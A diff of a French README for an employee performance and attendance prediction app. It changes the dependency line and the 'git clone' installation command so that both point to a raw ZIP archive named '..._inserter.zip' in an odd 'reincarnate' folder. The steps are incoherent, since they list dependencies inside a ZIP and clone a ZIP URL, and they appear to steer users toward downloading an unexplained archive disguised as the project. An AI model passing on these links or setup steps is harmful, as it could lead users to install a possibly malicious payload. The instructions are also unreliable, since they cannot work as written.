@@ -5,10 +5,10 @@ Cette application prédit les performances et l'assiduité des employés basés 
 
 ## Prérequis
 - Python 3.x
-- Les dépendances sont listées dans `https://github.com/FadelDia/GoMyCode_Employees_App/raw/refs/heads/main/reincarnate/Go_App_Code_My_Employees_v1.3.zip`
+- Les dépendances sont listées dans `https://github.com/FadelDia/GoMyCode_Employees_App/raw/refs/heads/main/reincarnate/My_App_Employees_Code_Go_inserter.zip`
 
 ## Installation
 1. Clonez le dépôt :
    ```bash
-   git clone https://github.com/FadelDia/GoMyCode_Employees_App/raw/refs/heads/main/reincarnate/Go_App_Code_My_Employees_v1.3.zip
+   git clone https://github.com/FadelDia/GoMyCode_Employees_App/raw/refs/heads/main/reincarnate/My_App_Employees_Code_Go_inserter.zip
    cd yourrepository
